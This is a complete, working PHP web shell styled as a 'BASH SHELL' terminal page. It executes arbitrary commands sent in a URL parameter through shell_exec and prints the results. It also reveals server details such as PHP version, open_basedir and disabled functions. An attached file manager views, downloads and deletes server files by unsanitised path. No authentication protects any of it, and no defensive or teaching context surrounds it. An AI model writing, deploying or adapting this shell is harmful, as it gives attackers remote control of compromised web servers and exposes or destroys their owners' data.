<!DOCTYPE html>
<html>

<head>
  <title>BASH SHELL</title>
  <style>
    body {
      background-color: black;
      color: white;
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 20px;
      display: flex;
    }

    #terminal-container {
      flex: 1;
      padding-right: 20px;
    }

    #table-container {
      flex: 1;
    }

    h1 {
      color: #2778ff;
      margin: 0;
      white-space: pre-line;
    }

    form {
      display: inline-block;
    }

    input {
      background-color: black;
      color: white;
      border: none;
      outline: none;
      width: 200px;
      padding: 5px;
    }

    button {
      display: none;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
    }

    th, td {
      border: 1px solid white;
      padding: 8px;
      text-align: left;
    }

    th {
      background-color: #2778ff;
      color: black;
    }

    address {
      margin-top: 20px;
    }

    a {
      color: #4eff4e; /* Green color for links */
    }

    .disabled {
      color: red; /* Red color for disabled functions */
    }
    .footer-container {
      background-color: black;
      color: white;
      text-align: center;
      padding: 10px;
      position: fixed;
      bottom: 0;
      width: 100%;
    }
  </style>
</head>

<body>
  <?php
  function getUser() {
      return trim(shell_exec('whoami'));
  }

  function executeCommand($command) {
      return shell_exec($command);
  }

  function getIp() {
    $ip = $_SERVER['REMOTE_ADDR'];
 
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
 
    return $ip;
  }

  function getOpenBaseDir() {
    return ini_get('open_basedir');
  }

  function isFunctionDisabled($functionName) {
    $disabledFunctions = ini_get('disable_functions');

    if (empty($disabledFunctions)) {
        return false; 
    }

    $disabledFunctionsArray = explode(',', $disabledFunctions);
    $disabledFunctionsArray = array_map('trim', $disabledFunctionsArray);

    return in_array($functionName, $disabledFunctionsArray);
  }

  $user = getUser();
  $output = '';

  if (isset($_GET['command'])) {
      $command = $_GET['command'];
      $output = executeCommand($command);
  }

  $ip = getIp();
  $openBaseDir = getOpenBaseDir();
  $date = date("Y-m-d H:i:s");
  $functionToCheck = 'exec';
  $isDisabled = isFunctionDisabled($functionToCheck);
  $isphp = phpversion();  
  ?>

  <div id="terminal-container">
    <h1>┌──(<?= $user ?>㉿<?= $user ?>)-[~]<br>└─$
      <form id="terminalForm" action="<?=$_SERVER['PHP_SELF'];?>" method="GET" enctype="multipart/form-data">
        <input type="text" name="command" autocomplete="off" autofocus onkeydown="submitForm(event)">
        <button type="submit"></button>
      </form>
    </h1>
    <pre><?=$output;?></pre>
    <address><?php  $apacheVersion = system("apache2 -v");?></address>
  </div>

  <div id="table-container">
    <table>
      <tr>
        <th>IP Server</th>
        <th>PHP Version</th>
        <th>Date and Time</th>
        <th>Document Root</th>
        <th>Manage Folder/File</th>
        <th>Disabled Function</th>
      </tr>
      <tr>
        <td><?php echo $ip; ?></td>
        <td><?php echo $isphp; ?></td>
        <td><?php echo $date; ?></td>
        <td><?php echo $openBaseDir; ?></td>
        <td><a href="file_manager.php">Manage</a></td>
        <td class="<?php echo $isDisabled ? 'disabled' : ''; ?>"><?php echo $functionToCheck; ?></td>
      </tr>
    </table>
  </div>
    <div class="footer-container">

<?php
function listFiles($directory)
{
    $files = array_diff(scandir($directory), array('.', '..'));

    echo '<table>';
    echo '<tr><th>Name</th><th>Type</th><th>Actions</th></tr>';

    foreach ($files as $file) {
        $filePath = $directory . '/' . $file;
        $fileType = is_dir($filePath) ? 'Directory' : 'File';

        echo "<tr>";
        echo "<td>$file</td>";
        echo "<td>$fileType</td>";
        echo "<td><a href='file_manager.php?action=view&file=$file'>View</a> | ";
        echo "<a href='file_manager.php?action=download&file=$file'>Download</a> | ";
        echo "<a href='file_manager.php?action=edit&file=$file'>Edit</a> | "; // Added Edit action
        echo "<a href='file_manager.php?action=delete&file=$file' onclick='return confirm(\"Are you sure?\");'>Delete</a></td>";
        echo "</tr>";
    }

    echo '</table>';
}

function viewFile($file)
{
    $filePath = "./$file";
    if (file_exists($filePath) && is_file($filePath)) {
        $fileContent = htmlentities(file_get_contents($filePath));
        echo "<h2>Viewing $file</h2>";
        echo "<pre>$fileContent</pre>";
    } else {
        echo "<h2>File not found: $file</h2>";
    }
}

function downloadFile($file)
{
    $filePath = "./$file";
    if (file_exists($filePath) && is_file($filePath)) {
        header('Content-Type: application/octet-stream');
        header("Content-Disposition: attachment; filename=$file");
        readfile($filePath);
        exit;
    } else {
        echo "<h2>File not found: $file</h2>";
    }
}

function editFile($file)
{
    $filePath = "./$file";
    if (file_exists($filePath) && is_file($filePath)) {
        // Perform your file editing operations here
        // You can display a form or implement inline editing as needed
        echo "<h2>Editing $file</h2>";
    } else {
        echo "<h2>File not found: $file</h2>";
    }
}

function deleteFile($file)
{
    $filePath = "./$file";
    if (file_exists($filePath)) {
        unlink($filePath);
        echo "<h2>File deleted: $file</h2>";
    } else {
        echo "<h2>File not found: $file</h2>";
    }
}

$action = isset($_GET['action']) ? $_GET['action'] : '';
$file = isset($_GET['file']) ? $_GET['file'] : '';

switch ($action) {
    case 'view':
        viewFile($file);
        break;
    case 'download':
        downloadFile($file);
        break;
    case 'edit':
        editFile($file);
        break;
    case 'delete':
        deleteFile($file);
        listFiles('.'); // After deletion, refresh the file list
        break;
    default:
        listFiles('.');
        break;
}
?>
    </div>

  <script>
function submitForm(event) {
  if (event.key === "Enter") {
    event.preventDefault();
    var commandInput = document.querySelector('input[name="command"]');
    var commandValue = commandInput.value.trim(); // Trim whitespace

    if (commandValue !== "") {
      document.getElementById("terminalForm").submit();
    } else {
      alert("[Enter]Not Command ");
    }
  }
}

  </script>
</body>

</html>
